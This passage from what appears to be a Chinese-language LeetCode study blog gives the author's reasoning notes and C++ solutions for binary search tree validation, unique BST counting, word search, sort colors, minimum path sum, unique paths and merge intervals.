punctuation">;</span>                <span class="token punctuation">&#125;</span>                pre<span class="token operator">-></span>right <span class="token operator">=</span> cur<span class="token operator">-></span>right<span class="token punctuation">;</span>                cur<span class="token operator">-></span>left <span class="token operator">=</span> <span class="token keyword">nullptr</span><span class="token punctuation">;</span>                cur<span class="token operator">-></span>right <span class="token operator">=</span> curLeft<span class="token punctuation">;</span>              <span class="token punctuation">&#125;</span>            <span class="token comment">// cur = curLeft;  // ！x:需要考虑左子树为空，</span>            cur <span class="token operator">=</span> cur<span class="token operator">-></span>right<span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token punctuation">;</span></code></pre></li></ol><h3 id="验证二叉搜索树">2023-10-02 <ahref="https://leetcode.cn/problems/validate-binary-search-tree/description/">98.验证二叉搜索树</a></h3><h4 id="我思-15">我思</h4><ol type="1"><li>递归判断<ol type="1"><li>左子树 &lt; 根节点 &lt; 右子树</li><li>边界情况<ol type="1"><li>无子树</li></ol></li></ol></li></ol><h4 id="实现-15">实现</h4><ol type="1"><li><p>每一层的递归该实现什么</p><ol type="1"><li>边界条件（递归结束的条件）和 进入下一层递归的代码</li><li>考虑参数、返回值</li></ol></li><li><p>Code</p><pre class="language-cpp" data-language="cpp"><code class="language-cpp"><span class="token keyword">class</span> <span class="token class-name">Solution</span> <span class="token punctuation">&#123;</span>   <span class="token keyword">public</span><span class="token operator">:</span>    <span class="token keyword">bool</span> <span class="token function">isValidBST</span><span class="token punctuation">(</span>TreeNode<span class="token operator">*</span> root<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">return</span> <span class="token function">helper</span><span class="token punctuation">(</span>root<span class="token punctuation">,</span> LONG_MIN<span class="token punctuation">,</span> LONG_MAX<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token comment">// 设计递归</span>    <span class="token keyword">bool</span> <span class="token function">helper</span><span class="token punctuation">(</span>TreeNode<span class="token operator">*</span> root<span class="token punctuation">,</span> <span class="token keyword">long</span> <span class="token keyword">long</span> lower<span class="token punctuation">,</span> <span class="token keyword">long</span> <span class="token keyword">long</span> upper<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span>root <span class="token operator">==</span> <span class="token keyword">nullptr</span><span class="token punctuation">)</span>            <span class="token keyword">return</span> <span class="token boolean">true</span><span class="token punctuation">;</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span>root<span class="token operator">-></span>val <span class="token operator">&lt;=</span> lower <span class="token operator">||</span> root<span class="token operator">-></span>val <span class="token operator">>=</span> upper<span class="token punctuation">)</span>            <span class="token keyword">return</span> <span class="token boolean">false</span><span class="token punctuation">;</span>        <span class="token keyword">return</span> <span class="token function">helper</span><span class="token punctuation">(</span>root<span class="token operator">-></span>left<span class="token punctuation">,</span> lower<span class="token punctuation">,</span> root<span class="token operator">-></span>val<span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span>               <span class="token function">helper</span><span class="token punctuation">(</span>root<span class="token operator">-></span>right<span class="token punctuation">,</span> root<span class="token operator">-></span>val<span class="token punctuation">,</span> upper<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token punctuation">;</span></code></pre></li></ol><h3 id="不同的二叉搜索树">2023-09-28 <ahref="https://leetcode.cn/problems/unique-binary-search-trees/description/">96.不同的二叉搜索树</a></h3><h4 id="我思-16">我思</h4><ol type="1"><li>根节点确定，接下来的每个节点位置选择多样<ol type="1"><li>首先确定节点在树中的深度</li><li>确定作为哪个节点的子树</li><li>左子树还是右子树</li></ol></li></ol><h4 id="实现-16">实现</h4><ol type="1"><li><p>code</p><pre class="language-cpp" data-language="cpp"><code class="language-cpp"><span class="token keyword">class</span> <span class="token class-name">Solution</span> <span class="token punctuation">&#123;</span>   <span class="token keyword">public</span><span class="token operator">:</span>    <span class="token keyword">int</span> <span class="token function">numTrees</span><span class="token punctuation">(</span><span class="token keyword">int</span> n<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        vector<span class="token operator">&lt;</span><span class="token keyword">int</span><span class="token operator">></span> <span class="token function">dp</span><span class="token punctuation">(</span>n <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>   <span class="token comment">// 考虑n+1，因为dp[0]表示空树</span>        dp<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">1</span><span class="token punctuation">;</span>        dp<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">1</span><span class="token punctuation">;</span>        <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> i <span class="token operator">=</span> <span class="token number">2</span><span class="token punctuation">;</span> i <span class="token operator">&lt;</span> n <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>  <span class="token comment">// 子序列长度为i的树的总数;包括n</span>            <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> j <span class="token operator">=</span> <span class="token number">1</span><span class="token punctuation">;</span> j <span class="token operator">&lt;=</span> i<span class="token punctuation">;</span> j<span class="token operator">++</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>  <span class="token comment">// 以j为根节点;j不大于i</span>                <span class="token comment">// +的原因：需要枚举所有根节点，总和才是总数</span>                dp<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">+=</span> dp<span class="token punctuation">[</span>j <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">]</span> <span class="token operator">*</span> dp<span class="token punctuation">[</span>i <span class="token operator">-</span> j<span class="token punctuation">]</span><span class="token punctuation">;</span>            <span class="token punctuation">&#125;</span>        <span class="token punctuation">&#125;</span>        <span class="token keyword">return</span> dp<span class="token punctuation">[</span>n<span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token punctuation">;</span></code></pre></li></ol><h4 id="单词搜索">2023-09-21：<ahref="https://leetcode.cn/problems/word-search/description/">79.单词搜索</a></h4><h4 id="我思-17">我思</h4><ol type="1"><li>首先是得定位到相应的首字母，然后相同的首字母可能有多个</li><li>其次是从该首字母出发，满足相邻条件的路径很多</li><li>感觉挺困难</li></ol><h4 id="实现-17">实现</h4><ol type="1"><li><p>Code</p><pre class="language-cpp" data-language="cpp"><code class="language-cpp"><span class="token keyword">class</span> <span class="token class-name">Solution</span> <span class="token punctuation">&#123;</span>   <span class="token keyword">public</span><span class="token operator">:</span>    <span class="token keyword">bool</span> <span class="token function">exist</span><span class="token punctuation">(</span>vector<span class="token operator">&lt;</span>vector<span class="token operator">&lt;</span><span class="token keyword">char</span><span class="token operator">>></span><span class="token operator">&amp;</span> board<span class="token punctuation">,</span> string word<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">int</span> m <span class="token operator">=</span> board<span class="token punctuation">.</span><span class="token function">size</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span> n <span class="token operator">=</span> board<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">.</span><span class="token function">size</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token comment">// 记录是否访问过</span>        vector<span class="token operator">&lt;</span>vector<span class="token operator">&lt;</span><span class="token keyword">bool</span><span class="token operator">>></span> <span class="token function">visited</span><span class="token punctuation">(</span>m<span class="token punctuation">,</span> <span class="token generic-function"><span class="token function">vector</span><span class="token generic class-name"><span class="token operator">&lt;</span><span class="token keyword">bool</span><span class="token operator">></span></span></span><span class="token punctuation">(</span>n<span class="token punctuation">,</span> <span class="token boolean">false</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token comment">// 遍历每个点</span>        <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">&lt;</span> m<span class="token punctuation">;</span> <span class="token operator">++</span>i<span class="token punctuation">)</span>            <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> j <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> j <span class="token operator">&lt;</span> n<span class="token punctuation">;</span> <span class="token operator">++</span>j<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>                <span class="token comment">// 回溯</span>                <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">backTracking</span><span class="token punctuation">(</span>board<span class="token punctuation">,</span> visited<span class="token punctuation">,</span> word<span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> i<span class="token punctuation">,</span> j<span class="token punctuation">)</span><span class="token punctuation">)</span>                    <span class="token keyword">return</span> <span class="token boolean">true</span><span class="token punctuation">;</span>            <span class="token punctuation">&#125;</span>        <span class="token keyword">return</span> <span class="token boolean">false</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>   <span class="token keyword">private</span><span class="token operator">:</span>    <span class="token comment">// 回溯</span>    <span class="token keyword">bool</span> <span class="token function">backTracking</span><span class="token punctuation">(</span>vector<span class="token operator">&lt;</span>vector<span class="token operator">&lt;</span><span class="token keyword">char</span><span class="token operator">>></span><span class="token operator">&amp;</span> board<span class="token punctuation">,</span>                      vector<span class="token operator">&lt;</span>vector<span class="token operator">&lt;</span><span class="token keyword">bool</span><span class="token operator">>></span><span class="token operator">&amp;</span> visited<span class="token punctuation">,</span>                      <span class="token keyword">const</span> string<span class="token operator">&amp;</span> word<span class="token punctuation">,</span>                      <span class="token keyword">int</span> strCur<span class="token punctuation">,</span>                      <span class="token keyword">int</span> i<span class="token punctuation">,</span>                      <span class="token keyword">int</span> j<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span>strCur <span class="token operator">==</span> word<span class="token punctuation">.</span><span class="token function">size</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>            <span class="token keyword">return</span> <span class="token boolean">true</span><span class="token punctuation">;</span>        <span class="token comment">// 越界、已访问(形成环状)、不匹配</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span>i <span class="token operator">&lt;</span> <span class="token number">0</span> <span class="token operator">||</span> i <span class="token operator">>=</span> board<span class="token punctuation">.</span><span class="token function">size</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">||</span> j <span class="token operator">&lt;</span> <span class="token number">0</span> <span class="token operator">||</span> j <span class="token operator">>=</span> board<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">.</span><span class="token function">size</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">||</span> visited<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">[</span>j<span class="token punctuation">]</span> <span class="token operator">||</span>            board<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">[</span>j<span class="token punctuation">]</span> <span class="token operator">!=</span> word<span class="token punctuation">[</span>strCur<span class="token punctuation">]</span><span class="token punctuation">)</span>            <span class="token keyword">return</span> <span class="token boolean">false</span><span class="token punctuation">;</span>        visited<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">[</span>j<span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token boolean">true</span><span class="token punctuation">;</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">backTracking</span><span class="token punctuation">(</span>board<span class="token punctuation">,</span> visited<span class="token punctuation">,</span> word<span class="token punctuation">,</span> strCur <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">,</span> i <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">,</span> j<span class="token punctuation">)</span> <span class="token operator">||</span>            <span class="token function">backTracking</span><span class="token punctuation">(</span>board<span class="token punctuation">,</span> visited<span class="token punctuation">,</span> word<span class="token punctuation">,</span> strCur <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">,</span> i <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">,</span> j<span class="token punctuation">)</span> <span class="token operator">||</span>            <span class="token function">backTracking</span><span class="token punctuation">(</span>board<span class="token punctuation">,</span> visited<span class="token punctuation">,</span> word<span class="token punctuation">,</span> strCur <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">,</span> i<span class="token punctuation">,</span> j <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">)</span> <span class="token operator">||</span>            <span class="token function">backTracking</span><span class="token punctuation">(</span>board<span class="token punctuation">,</span> visited<span class="token punctuation">,</span> word<span class="token punctuation">,</span> strCur <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">,</span> i<span class="token punctuation">,</span> j <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">)</span>            <span class="token keyword">return</span> <span class="token boolean">true</span><span class="token punctuation">;</span>        visited<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">[</span>j<span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token boolean">false</span><span class="token punctuation">;</span>        <span class="token keyword">return</span> <span class="token boolean">false</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token punctuation">;</span></code></pre></li></ol><h3 id="颜色分类">2023-09-20：<ahref="https://leetcode.cn/problems/sort-colors/description/">75.颜色分类</a></h3><h4 id="我思-18">我思</h4><ol type="1"><li>双指针法，但我觉得这题得三指针法</li><li>确定两种元素的位置，剩下一种也就确认了</li></ol><h4 id="实现-18">实现</h4><ol type="1"><li><p>Code:确定一头一尾</p><pre class="language-cpp" data-language="cpp"><code class="language-cpp"><span class="token keyword">class</span> <span class="token class-name">Solution</span> <span class="token punctuation">&#123;</span>   <span class="token keyword">public</span><span class="token operator">:</span>    <span class="token keyword">void</span> <span class="token function">sortColors</span><span class="token punctuation">(</span>vector<span class="token operator">&lt;</span><span class="token keyword">int</span><span class="token operator">></span><span class="token operator">&amp;</span> nums<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token comment">// 双指针法</span>        <span class="token keyword">int</span> p0 <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">,</span> p2 <span class="token operator">=</span> nums<span class="token punctuation">.</span><span class="token function">size</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">;</span>        <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">&lt;=</span> p2<span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>            <span class="token keyword">while</span> <span class="token punctuation">(</span>i <span class="token operator">&lt;=</span> p2 <span class="token operator">&amp;&amp;</span> nums<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">==</span> <span class="token number">2</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>                <span class="token function">swap</span><span class="token punctuation">(</span>nums<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">,</span> nums<span class="token punctuation">[</span>p2<span class="token operator">--</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token punctuation">&#125;</span>            <span class="token keyword">if</span> <span class="token punctuation">(</span>nums<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">==</span> <span class="token number">0</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>                <span class="token function">swap</span><span class="token punctuation">(</span>nums<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">,</span> nums<span class="token punctuation">[</span>p0<span class="token operator">++</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token punctuation">&#125;</span>        <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token punctuation">;</span></code></pre></li></ol><h3 id="最小路径和">2023-09-19：<ahref="https://leetcode.cn/problems/minimum-path-sum/description/">64.最小路径和</a></h3><h4 id="我思-19">我思</h4><ol type="1"><li>dp 或者回溯，（回溯太久没接触，忘了）</li></ol><h4 id="实现-19">实现</h4><ol type="1"><li><p>两层for循环都不会写了</p><pre class="language-cpp" data-language="cpp"><code class="language-cpp"><span class="token keyword">class</span> <span class="token class-name">Solution</span> <span class="token punctuation">&#123;</span>   <span class="token keyword">public</span><span class="token operator">:</span>    <span class="token keyword">int</span> <span class="token function">minPathSum</span><span class="token punctuation">(</span>vector<span class="token operator">&lt;</span>vector<span class="token operator">&lt;</span><span class="token keyword">int</span><span class="token operator">>></span><span class="token operator">&amp;</span> grid<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token comment">// dp；每次只能向右或者向下</span>        <span class="token comment">// 误区：每次选最小路径去走，最终到右下角不一定是最小路径</span>        <span class="token comment">// 但是此位置的最小路径</span>        <span class="token comment">// 前一步一定是从上一步的更小路径走出来的，因此我们仍然是计算每个格子的最小</span>        <span class="token comment">// 最后从右下角的相邻两位置 选择更小的那个</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span>grid<span class="token punctuation">.</span><span class="token function">empty</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>            <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span>        <span class="token keyword">int</span> row <span class="token operator">=</span> grid<span class="token punctuation">.</span><span class="token function">size</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span> column <span class="token operator">=</span> grid<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">.</span><span class="token function">size</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        vector<span class="token operator">&lt;</span>vector<span class="token operator">&lt;</span><span class="token keyword">int</span><span class="token operator">>></span> <span class="token function">dp</span><span class="token punctuation">(</span>row<span class="token punctuation">,</span> <span class="token generic-function"><span class="token function">vector</span><span class="token generic class-name"><span class="token operator">&lt;</span><span class="token keyword">int</span><span class="token operator">></span></span></span><span class="token punctuation">(</span>column<span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token comment">// 初始化</span>        dp<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span> <span class="token operator">=</span> grid<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">;</span>        <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> i <span class="token operator">=</span> <span class="token number">1</span><span class="token punctuation">;</span> i <span class="token operator">&lt;</span> row<span class="token punctuation">;</span> <span class="token operator">++</span>i<span class="token punctuation">)</span>            dp<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span> <span class="token operator">=</span> dp<span class="token punctuation">[</span>i <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span> <span class="token operator">+</span> grid<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">;</span>        <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> j <span class="token operator">=</span> <span class="token number">1</span><span class="token punctuation">;</span> j <span class="token operator">&lt;</span> column<span class="token punctuation">;</span> <span class="token operator">++</span>j<span class="token punctuation">)</span>            dp<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">[</span>j<span class="token punctuation">]</span> <span class="token operator">=</span> dp<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">[</span>j <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">]</span> <span class="token operator">+</span> grid<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">[</span>j<span class="token punctuation">]</span><span class="token punctuation">;</span>        <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> i <span class="token operator">=</span> <span class="token number">1</span><span class="token punctuation">;</span> i <span class="token operator">&lt;</span> row<span class="token punctuation">;</span> <span class="token operator">++</span>i<span class="token punctuation">)</span>            <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> j <span class="token operator">=</span> <span class="token number">1</span><span class="token punctuation">;</span> j <span class="token operator">&lt;</span> column<span class="token punctuation">;</span> <span class="token operator">++</span>j<span class="token punctuation">)</span>                dp<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">[</span>j<span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token function">min</span><span class="token punctuation">(</span>dp<span class="token punctuation">[</span>i <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">[</span>j<span class="token punctuation">]</span><span class="token punctuation">,</span> dp<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">[</span>j <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">+</span> grid<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">[</span>j<span class="token punctuation">]</span><span class="token punctuation">;</span>        <span class="token keyword">return</span> dp<span class="token punctuation">[</span>row <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">[</span>column <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token punctuation">;</span></code></pre></li></ol><h3 id="不同路径">2023-09-14： <ahref="https://leetcode.cn/problems/unique-paths/description/">62.不同路径</a></h3><h4 id="我思-20">我思</h4><ol type="1"><li>一个变量记录符合的路径数</li><li>需要保存前面走过的路径，而在每一步，接下来都有多个走法，一步步试探？</li></ol><h4 id="实现-20">实现</h4><ol type="1"><li>认识和抓住问题</li><li>识破问题本质</li><li>观察、发现规律（共性）</li></ol><hr /><ol type="1"><li><p>排列组合（代码没懂）</p><pre class="language-cpp" data-language="cpp"><code class="language-cpp"><span class="token keyword">class</span> <span class="token class-name">Solution</span> <span class="token punctuation">&#123;</span>   <span class="token keyword">public</span><span class="token operator">:</span>    <span class="token keyword">int</span> <span class="token function">uniquePaths</span><span class="token punctuation">(</span><span class="token keyword">int</span> m<span class="token punctuation">,</span> <span class="token keyword">int</span> n<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token comment">// 排列组合</span>        <span class="token comment">// 从左上角到右下角，一共需要走 m+n-2 步，其中 m-1 步向下，n-1 步向右</span>        <span class="token comment">// 一共有 C(m+n-2, m-1) 种走法</span>        <span class="token comment">// 确定了哪些步数是向下的，自然就确定了路线</span>        <span class="token comment">// 计算C(m+n-2, m-1) </span>        <span class="token comment">// 由于 m+n-2 和 m-1 都不大，所以可以直接计算</span>        <span class="token comment">// 但是如果 m+n-2 和 m-1 很大，就会溢出</span>        <span class="token keyword">long</span> ans <span class="token operator">=</span> <span class="token number">1</span><span class="token punctuation">;</span>        <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> x <span class="token operator">=</span> n<span class="token punctuation">,</span> y <span class="token operator">=</span> <span class="token number">1</span><span class="token punctuation">;</span> y <span class="token operator">&lt;</span> m<span class="token punctuation">;</span> <span class="token operator">++</span>x<span class="token punctuation">,</span> <span class="token operator">++</span>y<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>            ans <span class="token operator">=</span> ans <span class="token operator">*</span> x <span class="token operator">/</span> y<span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>        <span class="token keyword">return</span> ans<span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token punctuation">;</span></code></pre></li><li><p>dp: 很好理解</p><pre class="language-cpp" data-language="cpp"><code class="language-cpp"><span class="token keyword">class</span> <span class="token class-name">Solution</span> <span class="token punctuation">&#123;</span>   <span class="token keyword">public</span><span class="token operator">:</span>    <span class="token keyword">int</span> <span class="token function">uniquePaths</span><span class="token punctuation">(</span><span class="token keyword">int</span> m<span class="token punctuation">,</span> <span class="token keyword">int</span> n<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token comment">// 动态规划</span>        <span class="token comment">// dp[i][j] = dp[i-1][j] + dp[i][j-1]</span>        vector<span class="token operator">&lt;</span>vector<span class="token operator">&lt;</span><span class="token keyword">int</span><span class="token operator">>></span> <span class="token function">dp</span><span class="token punctuation">(</span>m<span class="token punctuation">,</span> <span class="token generic-function"><span class="token function">vector</span><span class="token generic class-name"><span class="token operator">&lt;</span><span class="token keyword">int</span><span class="token operator">></span></span></span><span class="token punctuation">(</span>n<span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token comment">// 初始化</span>        <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">&lt;</span> m<span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>            dp<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">1</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>        <span class="token comment">// 初始化</span>        <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> j <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> j <span class="token operator">&lt;</span> n<span class="token punctuation">;</span> j<span class="token operator">++</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>            dp<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">[</span>j<span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">1</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>        <span class="token comment">// 递推</span>        <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> i <span class="token operator">=</span> <span class="token number">1</span><span class="token punctuation">;</span> i <span class="token operator">&lt;</span> m<span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>            <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> j <span class="token operator">=</span> <span class="token number">1</span><span class="token punctuation">;</span> j <span class="token operator">&lt;</span> n<span class="token punctuation">;</span>j<span class="token operator">++</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>                dp<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">[</span>j<span class="token punctuation">]</span> <span class="token operator">=</span> dp<span class="token punctuation">[</span>i <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">[</span>j<span class="token punctuation">]</span> <span class="token operator">+</span> dp<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">[</span>j <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">;</span>            <span class="token punctuation">&#125;</span>        <span class="token punctuation">&#125;</span>        <span class="token keyword">return</span> dp<span class="token punctuation">[</span>m <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">[</span>n <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token punctuation">;</span></code></pre></li></ol><h3 id="合并区间">2023-09-13： <ahref="https://leetcode.cn/problems/merge-intervals/description/">56.合并区间</a></h3><h3 id="我思-21">我思</h3><ol type="1"><li><p>排序：依据左端点值</p></li><li><p>合并重合区间：数轴画图直观表示 <span class="math display">\[[a_j,a_k],[a_l,a_m]\\1.\ 必有a_l&gt;=a_j\\2.\ 如果a_l&lt;=a_k,那么两区间必定能合并\]</span></p></li></ol><h4 id="实现-21">实现</h4><ol type="1"><li><p>主要是合并的判断</p><pre class="language-cpp" data-language="cpp"><code class="language-cpp"><span class="token keyword">class</span> <span class="token class-name">Solution</span> <span class="token punctuation">&#123;</span>   <span class="token keyword">public</span><span class="token operator">:</span>    vector<span class="token operator">&lt;</span>vector<span class="token operator">&lt;</span><span class="token keyword">int</span><span class="token operator">>></span> <span class="token function">merge</span><span class="token punctuation">(</span>vector<span class="token operator">&lt;</span>vector<span class="token operator">&lt;</span><span class="token keyword">int</span><span class="token operator">>></span><span class="token operator">&amp;</span> intervals<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token comment">// 结果集</span>        vector<span class="token operator">&lt;</span>vector<span class="token operator">&lt;</span><span class="token keyword">int</span><span class="token operator">>></span> ans<span class="token punctuation">;</span>        <span class="token comment">// 边界处理</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span>intervals<span class="token punctuation">.</span><span class="token function">size</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token number">0</span><span 